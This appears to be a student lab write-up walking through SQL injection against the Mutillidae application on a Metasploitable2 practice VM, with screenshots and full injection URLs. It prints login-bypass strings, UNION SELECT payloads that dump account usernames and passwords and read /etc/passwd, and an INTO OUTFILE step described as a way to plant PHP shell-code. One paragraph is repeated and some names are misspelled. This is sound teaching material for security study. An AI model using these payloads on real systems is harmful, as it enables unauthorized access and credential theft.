# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:
### Step 1:
Install kali linux either in partition or virtual box or in live mode

### Step 2:
Investigate on the various categories of tools as follows:

### Step 3:
Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/17197254-76bf-496f-b637-8969d19a96f5)


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/b5892a20-c96a-452a-b072-6c878368b0d0)


Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/90864b05-0035-48f0-9929-87323a9ad78c)


Click on the menu Login/Register and register for an account
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/03877c7f-060f-4b62-847b-b5a5cd2866b7)


Click on the link “Please register here”
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/0be8e1ad-562c-4726-8e26-e93458f024c0)

Click on “Create Account” to display the following page:
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/89c8c5d1-49d4-4022-84d2-fa6e10ee1c15)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/8648d9c7-3bc4-4b79-856a-d20e9d34392a)

Click “Login”. The logged in page will show as below:
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/508cb9a5-7aab-4d6a-9db4-093db93a4e0e)

### Bypassing login field
The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/eaf167ea-5d14-4a76-9447-2908ab17baf9)

Click the login button and you will see it enter into the administrator page
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/3f752334-37cb-4f9d-941e-45c0550173aa)

### Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: 
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/e3dbcbe7-4e53-4df4-9bf9-3177d1ca53c6)

![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/a4ea5e8c-0075-4296-9c4b-315dfea30bf9)

![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/de6ff689-8388-46f8-ad13-a465dcb2c662)

![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/16310779-59a0-4344-97e3-65212b995788)

![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/221b8430-02b1-4aba-b4c6-e2f218529152)


From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/675ce0df-7ba5-4028-9dcc-24657f4eeff4)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/d78fd60e-f60d-4cba-9cec-525f03d069c2)

After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/c73f13b1-7af0-40a3-8673-88e750ef26aa)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/f2391c7c-6d70-4f5b-b172-99e12b6e50c8)

As it is having 5 columns the query worked fine and it provides the correct result
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/f460d1a4-330f-40be-ba74-d97f041dc395)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/ab13af51-9fba-4b28-9133-8673e4ef4f91)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/a11eb4c6-e695-4c6c-9e98-e395d724a187)


Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/c8d4af88-75f4-4ec1-b24e-d639ae57955f)


The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/1f35ed46-0e9c-420f-8e6f-c142c8601e73)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/ffdf9fd6-2480-43d9-818c-f27126c1c0c0)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/c1c74c0f-47b6-4b63-a37c-7d44a3787381)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/fec29da0-b996-47a6-8672-d7389aacbe71)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/e41ce27f-89ff-4121-b8f7-38316dadb24b)

Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Lakshmipriya2005/sqlinjection/assets/115525361/9680a38a-b4b3-41b2-983e-81d0a2fa5991)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
